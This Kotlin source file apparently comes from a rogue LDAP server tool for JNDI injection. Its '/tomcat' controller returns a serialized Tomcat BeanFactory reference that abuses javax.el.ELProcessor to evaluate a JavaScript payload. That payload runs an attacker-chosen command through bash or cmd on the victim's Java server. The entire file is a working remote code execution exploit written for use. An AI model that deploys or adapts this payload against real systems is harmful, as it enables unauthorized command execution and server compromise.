package ldap.controllers

import Options
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.sdk.Entry
import com.unboundid.ldap.sdk.LDAPResult
import com.unboundid.ldap.sdk.ResultCode
import org.apache.naming.ResourceRef
import util.serialize
import javax.naming.StringRefAddr


@LDAPMapping(["/tomcat"])
class Tomcat : Controller {

    private val jsStr = """var strs=new Array(3);
        |if(java.io.File.separator.equals('/')) {
        |    strs[0]='/bin/bash';
        |    strs[1]='-c';
        |    strs[2]='${Options.command}';
        |} else {
        |    strs[0]='cmd';
        |    strs[1]='/C';
        |    strs[2]='${Options.command}';
        |}
        |java.lang.Runtime.getRuntime().exec(strs);
    """.trimMargin().replace("\n", "")

    private val payload = """{
        |"".getClass().forName("javax.script.ScriptEngineManager")
        |.newInstance().getEngineByName("JavaScript")
        |.eval("$jsStr")}
    """.trimMargin().replace("\n", "")

    override fun sendResult(result: InMemoryInterceptedSearchResult, base: String) {
        val ref = ResourceRef(
            "javax.el.ELProcessor", null, "", "",
            true, "org.apache.naming.factory.BeanFactory", null
        ).apply {
            add(StringRefAddr("forceString", "x=eval"))
            add(StringRefAddr("x", payload))
        }
        val entry = Entry(base).apply {
            addAttribute("javaClassName", "java.lang.String")  // could be any
            addAttribute("javaSerializedData", serialize(ref))
        }

        result.sendSearchEntry(entry)
        result.result = LDAPResult(0, ResultCode.SUCCESS)
    }
}
